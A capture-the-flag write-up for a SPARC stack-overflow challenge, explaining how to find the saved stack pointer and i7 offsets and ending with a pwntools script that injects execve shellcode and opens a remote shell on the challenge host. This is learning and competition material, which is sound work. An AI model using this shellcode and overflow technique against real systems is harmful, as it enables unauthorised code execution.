# Secret Pwnhub Academy Rewards Club

This is a ret2shellcode pwn challenge, relatively simple, except its a special architecture. Sparc.

I used http://www.ouah.org/UNF-sparc-overflow.html to learn about how to exploit this.
I used shellcode from https://packetstormsecurity.com/files/30970/sparc-sh.c.html since the shellcode from the link above didn't seem to work.

The binary has no protections besides partial relro.

sparc is big endian, so we'll have to make sure that we pack things correctly. When you run the binary, it prints out the address of offset 512 of the buffer. There's some overflow, it reads too much into the buffer.

In sparc, on the stack, there's two important things - a value put into the stack pointer, and a value put into i7, the sort of "return address" of sparc. The program will go to i7+8.

We need to make sure that this stack pointer value is a stack address, and is properly aligned. i7 must also be aligned.

The save address that will go into the stack pointer(sp) is right before the value that will go into i7.

We can use a simple cyclic pattern to find the i7 offset - remember we must unpack the overwritten i7 value in big endian, not little.

This reveals that i7 is at offset 700 of our input, so offset 696 has the stack pointer save.

Now, since we know the address of our input, we can make the program jump in our input, and put some shellcode inside of it.

The exploit:
1. Receive the stack address(buffer+512)
2. Send payload. At offset 512, shellcode. At offset 696, some stack address. At offset 700, the address given to us by program-8.

IMPORTANT: We must subtract 8 from the address of our shellcode as i7+8 is jumped to.

I subtracted 256 from the program given address to get my stack pointer save, but it really doesn't matter as long as its aligned. You could even keep it unchanged.
Script below.
```py
from pwn import *
context.arch = 'sparc'
context.endian = 'big'
shellcode = b"\x21\x0b\xd8\x9a\xa0\x14\x21\x6e\x23\x0b\xcb\xdc\xa2\x14\x63\x68\xe0\x3b\xbf\xf0\xc0\x23\xbf\xf8\x90\x23\xa0\x10\xc0\x23\xbf\xec\xd0\x23\xbf\xe8\x92\x23\xa0\x18\x94\x22\x80\x0a\x82\x10\x20\x3b\x91\xd0\x20\x08"
p = remote('localhost',4444) if args.LOCAL else remote('flu.xxx', 2020)
stackaddr = int(p.recvline(),16)
log.info(f"Stack address middle of buffer: {hex(stackaddr)}")
pause()
save = stackaddr - 256
payload = fit({512: shellcode, 700-4: save, 700:stackaddr-8})
p.sendline(payload)
p.interactive()
```
